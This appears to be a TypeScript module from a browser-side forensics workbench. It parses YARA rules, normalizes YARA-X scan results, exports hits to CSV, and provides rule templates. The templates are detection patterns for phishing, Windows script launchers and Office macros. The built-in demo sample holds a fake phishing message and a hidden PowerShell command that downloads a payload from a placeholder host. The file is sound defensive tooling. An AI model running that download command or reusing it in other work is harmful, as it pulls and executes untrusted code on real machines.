/**
 * Forensics++ (ForensicsPP.com)
 * Local-first browser forensics workbench
 *
 * Copyright (c) 2026 DyNooob. All rights reserved.
 * Author: DyNooob
 * Website: https://www.loken.cn
 * Platform: DigiForensics.cn
 * Project: https://git.loken.cn/dynooob/ForensicsPP
 *
 * Forensics++ is an open-source, browser-side toolkit for CTF/MISC,
 * lightweight forensic triage, encoding/decoding, metadata inspection,
 * hashes, archive parsing, and local analysis.
 *
 * Do not use this project for unauthorized access, intrusion,
 * privacy infringement, or unlawful activity.
 *
 * Released under the MIT License.
 * Full source code: https://git.loken.cn/dynooob/ForensicsPP
 */

import type { YaraBatchRow, YaraRuleDef, YaraRuleResult, YaraScanResult, YaraStringDef, YaraStringHit } from "../../models";
import { hexPreview, previewText } from "../../utils/binary";
import { formatBytes } from "../../utils/files";

export type YaraXPatternMatch = { offset: number; length: number; xorKey?: number };
export type YaraXPattern = {
  identifier: string;
  kind: string;
  isPrivate: boolean;
  matches: YaraXPatternMatch[];
};
export type YaraXRuleMatch = {
  identifier: string;
  namespace: string;
  isGlobal: boolean;
  isPrivate: boolean;
  tags: string[];
  metadata: Array<{ identifier: string; value: unknown }>;
  patterns: YaraXPattern[];
};
export type YaraXScanOutput = {
  valid: boolean;
  errors?: string[];
  warnings?: string[];
  matches: YaraXRuleMatch[];
};

function splitYaraRules(ruleText: string): YaraRuleDef[] {
  const rules: YaraRuleDef[] = [];
  const regex = /\b(?:private\s+|global\s+)?rule\s+([A-Za-z_][\w]*)\s*([^{}]*)\{/g;
  let match: RegExpExecArray | null;
  while ((match = regex.exec(ruleText))) {
    const name = match[1];
    const tagText = match[2] ?? "";
    let cursor = regex.lastIndex;
    let depth = 1;
    while (cursor < ruleText.length && depth > 0) {
      const char = ruleText[cursor];
      if (char === "{") depth += 1;
      if (char === "}") depth -= 1;
      cursor += 1;
    }
    const body = ruleText.slice(regex.lastIndex, cursor - 1);
    regex.lastIndex = cursor;
    rules.push(parseYaraRuleBody(name, tagText, body));
  }
  return rules;
}

function parseYaraRuleBody(name: string, tagText: string, body: string): YaraRuleDef {
  const normalizedBody = body.replace(/\s+(?=(?:meta|strings|condition)\s*:)/gi, "\n");
  const section = (label: string) => normalizedBody.match(new RegExp(`${label}:([\\s\\S]*?)(?=\\n\\s*(?:meta|string|condition)s?:|$)`, "i"))?.[1] ?? "";
  const meta = Array.from(section("meta").matchAll(/([A-Za-z_]\w*)\s*=\s*("(?:\\"|[^"])*"|-?\d+(?:\.\d+)?|true|false)/gi))
    .map((item) => [item[1], item[2].replace(/^"|"$/g, "")] as [string, string]);
  const strings: YaraStringDef[] = [];
  const definitions = section("strings").matchAll(/(\$[A-Za-z_][\w]*)\s*=\s*("(?:\\"|[^"])*"|\{[^}]+\}|\/(?:\\\/|[^/])+\/)([\s\S]*?)(?=\s+\$[A-Za-z_][\w]*\s*=|$)/g);
  for (const item of definitions) {
    const id = item[1];
    const value = item[2].trim();
    const modifiers = item[3].trim().split(/\s+/).filter(Boolean);
    if (value.startsWith('"')) strings.push({ id, kind: "text", pattern: value.slice(1, -1).replace(/\\"/g, '"'), modifiers });
    else if (value.startsWith("{")) strings.push({ id, kind: "hex", pattern: value.slice(1, -1).trim(), modifiers });
    else strings.push({ id, kind: "regex", pattern: value.slice(1, -1), modifiers });
  }
  return {
    name,
    namespace: "default",
    tags: tagText.split(":").slice(1).join(":").trim().split(/\s+/).filter(Boolean),
    meta,
    strings,
    condition: section("condition").trim(),
    errors: []
  };
}

function hitContexts(data: Uint8Array, matches: YaraXPatternMatch[]) {
  return matches.slice(0, 12).map(({ offset, length }) => {
    const start = Math.max(0, offset - 32);
    const end = Math.min(data.length, offset + Math.max(1, length) + 48);
    const bytes = data.slice(start, end);
    const text = previewText(bytes, 180).replace(/\s+/g, " ").trim();
    return `0x${offset.toString(16).toUpperCase()}: ${text || hexPreview(bytes, 96)}`;
  });
}

function displayPattern(definition: YaraStringDef | undefined, pattern: YaraXPattern) {
  if (!definition) return pattern.identifier;
  if (definition.kind === "hex") return `{ ${definition.pattern} }`;
  if (definition.kind === "regex") return `/${definition.pattern}/`;
  return definition.pattern;
}

function matchedRuleResult(rule: YaraRuleDef, match: YaraXRuleMatch, data: Uint8Array): YaraRuleResult {
  const definitionById = new Map(rule.strings.map((item) => [item.id, item]));
  const hits: YaraStringHit[] = match.patterns.map((pattern) => {
    const matches = pattern.matches.slice(0, 200);
    return {
      id: pattern.identifier,
      pattern: displayPattern(definitionById.get(pattern.identifier), pattern),
      count: matches.length,
      offsets: matches.map((item) => item.offset),
      preview: matches.map((item) => `0x${item.offset.toString(16).toUpperCase()}`).join(", ") || "--",
      contexts: hitContexts(data, matches)
    };
  });
  return {
    rule: {
      ...rule,
      namespace: match.namespace || rule.namespace,
      tags: match.tags,
      meta: match.metadata.map((item) => [item.identifier, String(item.value)] as [string, string])
    },
    matched: true,
    score: `${hits.filter((item) => item.count > 0).length}/${hits.length}`,
    hits,
    condition: rule.condition,
    errors: []
  };
}

function unmatchedRuleResult(rule: YaraRuleDef): YaraRuleResult {
  return {
    rule,
    matched: false,
    score: `0/${rule.strings.length}`,
    hits: rule.strings.map((item) => ({
      id: item.id,
      pattern: item.kind === "hex" ? `{ ${item.pattern} }` : item.kind === "regex" ? `/${item.pattern}/` : item.pattern,
      count: 0,
      offsets: [],
      preview: "--",
      contexts: []
    })),
    condition: rule.condition,
    errors: []
  };
}

export function normalizeYaraXScan(ruleText: string, data: Uint8Array, name: string, output: YaraXScanOutput, compilerWarnings: string[] = []): YaraScanResult {
  const definitions = splitYaraRules(ruleText);
  const definitionByName = new Map(definitions.map((rule) => [rule.name, rule]));
  const matchByName = new Map(output.matches.map((match) => [match.identifier, match]));
  const results = definitions.map((rule) => {
    const match = matchByName.get(rule.name);
    return match ? matchedRuleResult(rule, match, data) : unmatchedRuleResult(rule);
  });
  for (const match of output.matches) {
    if (definitionByName.has(match.identifier)) continue;
    results.push(matchedRuleResult({
      name: match.identifier,
      namespace: match.namespace || "default",
      tags: match.tags,
      meta: match.metadata.map((item) => [item.identifier, String(item.value)]),
      strings: [],
      condition: "",
      errors: []
    }, match, data));
  }

  const warnings = [...compilerWarnings, ...(output.warnings ?? []), ...(output.errors ?? [])];
  const matched = results.filter((item) => item.matched);
  return {
    rows: [
      ["Sample", name],
      ["Size", formatBytes(data.length)],
      ["Engine", "YARA-X"],
      ["Rules", String(results.length)],
      ["Matched", String(matched.length)],
      ["Pattern hits", String(matched.reduce((sum, item) => sum + item.hits.reduce((count, hit) => count + hit.count, 0), 0))],
      ["Warnings", String(warnings.length)]
    ],
    results,
    findings: matched.length
      ? [{ level: "info", title: "YARA rules matched", detail: matched.map((item) => item.rule.name).join(", ") }]
      : [{ level: "info", title: "No YARA rule matched", detail: `${results.length} rule(s) scanned.` }],
    warnings
  };
}

export function yaraHitsToCsv(results: YaraRuleResult[]) {
  const escape = (value: unknown) => {
    const text = String(value);
    return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, "\"\"")}"` : text;
  };
  return [
    ["rule", "matched", "string_id", "pattern", "count", "offsets", "contexts"].join(","),
    ...results.flatMap((result) => result.hits.map((hit) => [
      result.rule.name,
      result.matched ? "yes" : "no",
      hit.id,
      hit.pattern,
      hit.count,
      hit.preview,
      hit.contexts.join(" | ")
    ].map(escape).join(",")))
  ].join("\n");
}

export function yaraBatchRowsToCsv(rows: YaraBatchRow[]) {
  const escape = (value: string | number) => {
    const text = String(value);
    return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, "\"\"")}"` : text;
  };
  return [
    ["name", "size_bytes", "matched_rules", "match_count", "string_hits", "warnings"].join(","),
    ...rows.map((row) => [row.name, row.size, row.matchedRules.join("; "), row.matchCount, row.stringHits, row.warnings.join("; ")].map(escape).join(","))
  ].join("\n");
}

export const yaraRuleTemplates = [
  {
    id: "phishing",
    label: "Phishing / Credential",
    rule: 'rule phishing_or_credential_clues : phishing credential {\n  meta:\n    author = "Forensics++"\n    description = "Credential and phishing wording, URL, script markers"\n  strings:\n    $password = "password" nocase ascii wide\n    $login = "login" nocase ascii wide\n    $verify = "verify" nocase ascii wide\n    $url = /https?:\\/\\/[^\\s\"\\\']+/ nocase\n    $ps = "powershell" nocase ascii wide\n    $hta = "mshta" nocase ascii wide\n  condition:\n    2 of them\n}'
  },
  {
    id: "windows-script",
    label: "Windows Script",
    rule: 'rule windows_script_execution_clues : windows script {\n  strings:\n    $cmd = "cmd.exe" nocase ascii wide\n    $ps = "powershell" nocase ascii wide\n    $wscript = "wscript" nocase ascii wide\n    $cscript = "cscript" nocase ascii wide\n    $rundll = "rundll32" nocase ascii wide\n    $regsvr = "regsvr32" nocase ascii wide\n    $mz = { 4D 5A }\n  condition:\n    any of them\n}'
  },
  {
    id: "office-macro",
    label: "Office Macro",
    rule: 'rule office_macro_suspicious_strings : office macro {\n  strings:\n    $autoopen = "AutoOpen" nocase ascii wide\n    $documentopen = "Document_Open" nocase ascii wide\n    $shell = "Shell" nocase ascii wide\n    $createobject = "CreateObject" nocase ascii wide\n    $http = "http" nocase ascii wide\n  condition:\n    2 of them\n}'
  }
];

export const defaultYaraSample = [
  "Subject: Account verification required",
  "Please verify your login at https://example-login.test/session",
  "Attached note:",
  "powershell -nop -w hidden -c Invoke-WebRequest http://example.test/payload.exe",
  "password reset token: demo-token-123"
].join("\n");
